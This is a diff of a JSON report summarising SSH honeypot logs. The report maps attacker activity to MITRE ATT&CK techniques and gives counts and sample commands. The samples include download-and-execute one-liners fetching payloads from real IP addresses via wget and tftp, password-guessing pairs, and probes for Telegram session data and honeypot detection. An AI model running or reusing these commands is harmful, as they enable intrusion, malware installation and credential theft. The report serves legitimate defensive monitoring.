@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-11 17:04:02",
+  "generated": "2026-09-11 18:01:46",
   "totals": {
-    "commands": 10594,
-    "login_failed": 7041,
-    "login_success": 3457,
-    "sessions": 7433
+    "commands": 10604,
+    "login_failed": 7314,
+    "login_success": 3463,
+    "sessions": 7734
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 7041,
+      "count": 7314,
       "examples": [
         "mathieu / mathieu",
         "mathieu / mathieu1",
@@ -21,14 +21,14 @@
         "mathieu / mathieu12345"
       ],
       "first": "2026-09-11T00:11:12.668081Z",
-      "last": "2026-09-11T16:47:52.949934Z",
-      "unique_ips": 85
+      "last": "2026-09-11T18:01:42.848197Z",
+      "unique_ips": 89
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 3457,
+      "count": 3463,
       "examples": [
         "ubuntu / ubuntu",
         "root / 1001chin",
@@ -37,8 +37,8 @@
         "ftpuser / ftpuser"
       ],
       "first": "2026-09-11T00:12:50.249197Z",
-      "last": "2026-09-11T16:47:58.664881Z",
-      "unique_ips": 63
+      "last": "2026-09-11T17:55:38.756485Z",
+      "unique_ips": 67
     },
     {
       "id": "T1222.002",
@@ -60,7 +60,7 @@
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 51,
+      "count": 53,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
@@ -69,14 +69,14 @@
         "/bin/busybox wget http://100.70.48.197:7069/lvn3/eU -O /dev/.none ; cat /dev/.none ; rm /dev/.none ; /bin/busybox ORsuav"
       ],
       "first": "2026-09-11T01:59:05.375558Z",
-      "last": "2026-09-11T15:37:01.467971Z",
-      "unique_ips": 14
+      "last": "2026-09-11T17:33:37.549570Z",
+      "unique_ips": 15
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 23,
+      "count": 27,
       "examples": [
         "uname -a",
         "uname -s -v -n -r -m",
@@ -85,8 +85,8 @@
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
       ],
       "first": "2026-09-11T00:13:02.581017Z",
-      "last": "2026-09-11T15:00:52.016597Z",
-      "unique_ips": 20
+      "last": "2026-09-11T17:55:38.988182Z",
+      "unique_ips": 22
     },
     {
       "id": "T1033",
@@ -103,6 +103,20 @@
       "unique_ips": 11
     },
     {
+      "id": "T1057",
+      "name": "Process Discovery",
+      "tactic": "Discovery",
+      "count": 3,
+      "examples": [
+        "ps | grep '[Mm]iner'",
+        "ps -ef | grep '[Mm]iner'",
+        "cat /proc/version 2>/dev/null; echo ---; cat /proc/1/cmdline 2>/dev/null; ls /opt/cowrie /home/cowrie /home/kippo 2>/dev"
+      ],
+      "first": "2026-09-11T07:42:09.866385Z",
+      "last": "2026-09-11T17:55:38.988182Z",
+      "unique_ips": 2
+    },
+    {
       "id": "T1059.004",
       "name": "Command and Scripting Interpreter: Unix Shell",
       "tactic": "Execution",
@@ -116,17 +130,18 @@
       "unique_ips": 3
     },
     {
-      "id": "T1057",
-      "name": "Process Discovery",
+      "id": "T1083",
+      "name": "File and Directory Discovery",
       "tactic": "Discovery",
-      "count": 2,
+      "count": 3,
       "examples": [
-        "ps | grep '[Mm]iner'",
-        "ps -ef | grep '[Mm]iner'"
+        "ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /va",
+        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
+        "cat /proc/version 2>/dev/null; echo ---; cat /proc/1/cmdline 2>/dev/null; ls /opt/cowrie /home/cowrie /home/kippo 2>/dev"
       ],
-      "first": "2026-09-11T07:42:09.866385Z",
-      "last": "2026-09-11T07:42:10.459451Z",
-      "unique_ips": 1
+      "first": "2026-09-11T07:42:11.094221Z",
+      "last": "2026-09-11T17:55:38.988182Z",
+      "unique_ips": 3
     },
     {
       "id": "T1070.004",
@@ -138,19 +153,6 @@
       ],
       "first": "2026-09-11T12:08:16.334878Z",
       "last": "2026-09-11T15:00:52.016597Z",
-      "unique_ips": 2
-    },
-    {
-      "id": "T1083",
-      "name": "File and Directory Discovery",
-      "tactic": "Discovery",
-      "count": 2,
-      "examples": [
-        "ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /va",
-        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
-      ],
-      "first": "2026-09-11T07:42:11.094221Z",
-      "last": "2026-09-11T09:35:37.574235Z",
       "unique_ips": 2
     },
     {
